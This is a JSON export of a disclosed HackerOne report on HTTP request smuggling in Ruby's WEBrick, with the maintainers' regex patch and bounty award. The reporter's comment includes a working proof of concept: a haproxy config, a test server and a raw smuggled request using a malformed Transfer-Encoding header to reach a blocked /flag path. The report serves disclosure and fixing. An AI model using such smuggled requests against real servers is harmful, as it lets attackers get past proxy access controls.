{"id":965267,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NjUyNjc=","url":"https://hackerone.com/reports/965267","title":"Potential HTTP Request Smuggling in ruby webrick","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-08-23T13:25:24.033Z","submitted_at":"2020-08-23T13:25:24.087Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"piao","url":"/piao","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-29T07:08:50.517Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-09-29T07:08:49.668Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"function read_body in file /lib/webrick/httprequest.rb use  expression ```/chunked/io``` to decide ```transfer-encoding``` whether or not.\nthat is not rigorous. When using webrick as a http server, a attacker may use  a ```Transfer-Encoding: AAAchunkedBBB``` header to fake a legal header. than can make a HTTP Request Smuggling attack.\n```\ndef read_body(socket, block)\n      return unless socket\n      if tc = self['transfer-encoding']\n        case tc\n        when /chunked/io then read_chunked(socket, block)\n        else raise HTTPStatus::NotImplemented, \"Transfer-Encoding: #{tc}.\"\n        end\n      elsif self['content-length'] || @remaining_size\n        @remaining_size ||= self['content-length'].to_i\n        while @remaining_size \u003e 0\n          sz = [@buffer_size, @remaining_size].min\n          break unless buf = read_data(socket, sz)\n          @remaining_size -= buf.bytesize\n          block.call(buf)\n        end\n        if @remaining_size \u003e 0 \u0026\u0026 @socket.eof?\n          raise HTTPStatus::BadRequest, \"invalid body size.\"\n        end\n      elsif BODY_CONTAINABLE_METHODS.member?(@request_method)\n        raise HTTPStatus::LengthRequired\n      end\n      return @body\n    end\n```\n\n## Impact\n\nIt is possible to smuggle the request and disrupt the user experience.","vulnerability_information_html":"\u003cp\u003efunction read_body in file /lib/webrick/httprequest.rb use  expression \u003ccode\u003e/chunked/io\u003c/code\u003e to decide \u003ccode\u003etransfer-encoding\u003c/code\u003e whether or not.\u003cbr\u003e\nthat is not rigorous. When using webrick as a http server, a attacker may use  a \u003ccode\u003eTransfer-Encoding: AAAchunkedBBB\u003c/code\u003e header to fake a legal header. than can make a HTTP Request Smuggling attack.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef read_body(socket, block)\n      return unless socket\n      if tc = self[\u0026#39;transfer-encoding\u0026#39;]\n        case tc\n        when /chunked/io then read_chunked(socket, block)\n        else raise HTTPStatus::NotImplemented, \u0026quot;Transfer-Encoding: #{tc}.\u0026quot;\n        end\n      elsif self[\u0026#39;content-length\u0026#39;] || @remaining_size\n        @remaining_size ||= self[\u0026#39;content-length\u0026#39;].to_i\n        while @remaining_size \u0026gt; 0\n          sz = [@buffer_size, @remaining_size].min\n          break unless buf = read_data(socket, sz)\n          @remaining_size -= buf.bytesize\n          block.call(buf)\n        end\n        if @remaining_size \u0026gt; 0 \u0026amp;\u0026amp; @socket.eof?\n          raise HTTPStatus::BadRequest, \u0026quot;invalid body size.\u0026quot;\n        end\n      elsif BODY_CONTAINABLE_METHODS.member?(@request_method)\n        raise HTTPStatus::LengthRequired\n      end\n      return @body\n    end\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIt is possible to smuggle the request and disrupt the user experience.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":86,"name":"HTTP Request Smuggling"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-10-29T07:08:49.762Z","allow_singular_disclosure_after":-5270818.276134829,"singular_disclosure_allowed":true,"vote_count":49,"voters":["derek0405","badcracker","mygf","haxta4ok00","realtess","since2003","khizer47","3x3s","sodium_","aksl337","and 39 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":28212,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/ruby/ruby","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9017607,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"for example, using haproxy to make CL-TE attack:\n\nhaproxy 1.5.3 version haproxy.cfg\nhaproxy.cfg forbid access ```/flag``` URI\n```\nglobal\n daemon\n maxconn 256\n\ndefaults\n mode http\n timeout connect 5000ms\n timeout client 50000ms\n timeout server 50000ms\n\nfrontend http-in\n bind *:80\n default_backend servers\n acl url_403 path_beg -i /flag\n http-request deny if url_403\n\nbackend servers\n server server1 127.0.0.1:8080 maxconn 32\n```\n\nhttp_server.rb\n```\n#!/usr/bin/env ruby\n\nrequire 'webrick'\n\nserver = WEBrick::HTTPServer.new(\n    :Port =\u003e 8080,\n)\n\nserver.mount_proc '/' do |req, res|\n  res.body = 'hello world'\nend\n\nserver.mount_proc '/flag' do |req, res|\n    res.body = 'flag is 123456'\n  end\n\nserver.start\n```\n\nuse this http request can bypass haproxy ```/flag``` restrict\n```\nPOST / HTTP/1.1\nHost: 127.0.0.1\nTransfer-Encoding: AAA chunked BBB\nConnection: keep-alive\nContent-Length: 50\n\n1\nA\n0\n\nGET /flag HTTP/1.1\nHost: 127.0.0.1\n\n\n```","markdown_message":"\u003cp\u003efor example, using haproxy to make CL-TE attack:\u003c/p\u003e\n\n\u003cp\u003ehaproxy 1.5.3 version haproxy.cfg\u003cbr\u003e\nhaproxy.cfg forbid access \u003ccode\u003e/flag\u003c/code\u003e URI\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eglobal\n daemon\n maxconn 256\n\ndefaults\n mode http\n timeout connect 5000ms\n timeout client 50000ms\n timeout server 50000ms\n\nfrontend http-in\n bind *:80\n default_backend servers\n acl url_403 path_beg -i /flag\n http-request deny if url_403\n\nbackend servers\n server server1 127.0.0.1:8080 maxconn 32\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ehttp_server.rb\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e#!/usr/bin/env ruby\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;webrick\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eserver\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eWEBrick\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eHTTPServer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n    \u003cspan class=\"ss\"\u003e:Port\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e8080\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eserver\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emount_proc\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ebody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;hello world\u0026#39;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eserver\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emount_proc\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/flag\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ebody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;flag is 123456\u0026#39;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eserver\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estart\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003euse this http request can bypass haproxy \u003ccode\u003e/flag\u003c/code\u003e restrict\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: 127.0.0.1\nTransfer-Encoding: AAA chunked BBB\nConnection: keep-alive\nContent-Length: 50\n\n1\nA\n0\n\nGET /flag HTTP/1.1\nHost: 127.0.0.1\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-08-24T03:47:55.804Z","updated_at":"2020-08-24T03:47:55.804Z","actor":{"username":"piao","cleared":false,"url":"/piao","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9043582,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-26T10:42:48.989Z","updated_at":"2020-08-26T10:42:48.989Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9044428,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@piao Did you file this to https://github.com/ruby/webrick/issues/57 ? We are surprised the unexpected disclosure because we are considering your report in the security team of Ruby language.","markdown_message":"\u003cp\u003e\u003ca href=\"/piao\"\u003e@piao\u003c/a\u003e Did you file this to \u003ca title=\"https://github.com/ruby/webrick/issues/57\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fruby%2Fwebrick%2Fissues%2F57\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/ruby/webrick/issues/57\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e ? We are surprised the unexpected disclosure because we are considering your report in the security team of Ruby language.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-26T12:02:16.695Z","updated_at":"2020-08-26T12:02:16.695Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9061778,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"yes, sorry i close this issue. ","markdown_message":"\u003cp\u003eyes, sorry i close this issue. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-28T01:43:58.531Z","updated_at":"2020-08-28T01:43:58.531Z","actor":{"username":"piao","cleared":false,"url":"/piao","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9227638,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"HI, thank you for your reporting. We'll fix the issue by the following patch. If there is anything that you noticed about that, please let us know, thanks.\n\n```diff\ndiff --git a/lib/webrick/httprequest.rb b/lib/webrick/httprequest.rb\nindex 87dc879175..6af0cee97d 100644\n--- a/lib/webrick/httprequest.rb\n+++ b/lib/webrick/httprequest.rb\n@@ -226,9 +226,9 @@ def parse(socket=nil)\n         raise HTTPStatus::BadRequest, \"bad URI `#{@unparsed_uri}'.\"\n       end\n-      if /close/io =~ self[\"connection\"]\n+      if /\\Aclose\\z/io =~ self[\"connection\"]\n         @keep_alive = false\n-      elsif /keep-alive/io =~ self[\"connection\"]\n+      elsif /\\Akeep-alive\\z/io =~ self[\"connection\"]\n         @keep_alive = true\n       elsif @http_version \u003c \"1.1\"\n         @keep_alive = false\n@@ -503,7 +503,7 @@ def read_body(socket, block)\n       return unless socket\n       if tc = self['transfer-encoding']\n         case tc\n-        when /chunked/io then read_chunked(socket, block)\n+        when /\\Achunked\\z/io then read_chunked(socket, block)\n         else raise HTTPStatus::NotImplemented, \"Transfer-Encoding: #{tc}.\"\n         end\n       elsif self['content-length'] || @remaining_size\n```","markdown_message":"\u003cp\u003eHI, thank you for your reporting. We\u0026#39;ll fix the issue by the following patch. If there is anything that you noticed about that, please let us know, thanks.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/lib/webrick/httprequest.rb b/lib/webrick/httprequest.rb\nindex 87dc879175..6af0cee97d 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/webrick/httprequest.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/webrick/httprequest.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -226,9 +226,9 @@\u003c/span\u003e def parse(socket=nil)\n         raise HTTPStatus::BadRequest, \u0026quot;bad URI `#{@unparsed_uri}\u0026#39;.\u0026quot;\n       end\n\u003cspan class=\"gd\"\u003e-      if /close/io =~ self[\u0026quot;connection\u0026quot;]\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+      if /\\Aclose\\z/io =~ self[\u0026quot;connection\u0026quot;]\n\u003c/span\u003e         @keep_alive = false\n\u003cspan class=\"gd\"\u003e-      elsif /keep-alive/io =~ self[\u0026quot;connection\u0026quot;]\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+      elsif /\\Akeep-alive\\z/io =~ self[\u0026quot;connection\u0026quot;]\n\u003c/span\u003e         @keep_alive = true\n       elsif @http_version \u0026lt; \u0026quot;1.1\u0026quot;\n         @keep_alive = false\n\u003cspan class=\"p\"\u003e@@ -503,7 +503,7 @@\u003c/span\u003e def read_body(socket, block)\n       return unless socket\n       if tc = self[\u0026#39;transfer-encoding\u0026#39;]\n         case tc\n\u003cspan class=\"gd\"\u003e-        when /chunked/io then read_chunked(socket, block)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+        when /\\Achunked\\z/io then read_chunked(socket, block)\n\u003c/span\u003e         else raise HTTPStatus::NotImplemented, \u0026quot;Transfer-Encoding: #{tc}.\u0026quot;\n         end\n       elsif self[\u0026#39;content-length\u0026#39;] || @remaining_size\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-09-15T14:08:51.062Z","updated_at":"2020-09-15T14:08:51.062Z","actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9232577,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It looks good. Thanks.","markdown_message":"\u003cp\u003eIt looks good. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-16T04:06:35.501Z","updated_at":"2020-09-16T04:06:35.501Z","actor":{"username":"piao","cleared":false,"url":"/piao","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9361211,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have just published webrick gem 1.6.1 and announced the vulnerability on our website. Thank you very much.\n\nI'd like to leave the decision about bounty to IBB program member or HackerOne staff.","markdown_message":"\u003cp\u003eWe have just published webrick gem 1.6.1 and announced the vulnerability on our website. Thank you very much.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;d like to leave the decision about bounty to IBB program member or HackerOne staff.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-29T06:47:53.980Z","updated_at":"2020-09-29T06:47:53.980Z","actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"piao","url":"/piao"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9361326,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-29T07:08:33.211Z","updated_at":"2020-09-29T07:08:33.211Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"piao","url":"/piao"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9361331,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-29T07:08:49.697Z","updated_at":"2020-09-29T07:08:49.697Z","first_to_agree":true,"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9667022,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-29T07:08:50.561Z","updated_at":"2020-10-29T07:08:50.561Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}